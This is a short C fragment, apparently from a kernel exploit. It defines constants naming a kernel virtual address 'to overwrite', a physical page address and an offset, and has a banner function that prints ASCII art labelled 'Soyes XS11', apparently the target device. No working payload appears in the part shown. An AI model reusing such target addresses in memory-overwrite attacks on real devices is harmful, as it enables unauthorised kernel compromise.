...
#define TARGET_KERNEL_VA   0xc09978fc   /* kernel VA to overwrite       */ 
#define TARGET_PHYS_ADDR   0x80997000   /* page-aligned physical address */
#define TARGET_PAGE_OFFSET 0x510        /* byte offset within page       */
...
void important_ascii_art()
{
    ...
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
    printf("\n\033[38;5;34m           Soyes XS11\033[0m\n\n");
}
